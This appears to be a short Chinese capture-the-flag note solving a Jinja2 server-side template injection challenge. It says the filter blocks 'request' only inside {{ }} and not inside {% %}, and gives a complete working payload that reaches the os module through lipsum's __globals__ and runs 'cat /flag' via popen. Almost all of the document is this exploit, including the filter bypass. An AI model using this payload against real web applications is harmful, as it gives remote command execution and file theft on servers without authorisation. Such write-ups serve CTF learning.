# 知识点
过滤了request，但是是再{{}}中过滤了request，没有在{% %}过滤request
# 思路
```python
?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
```
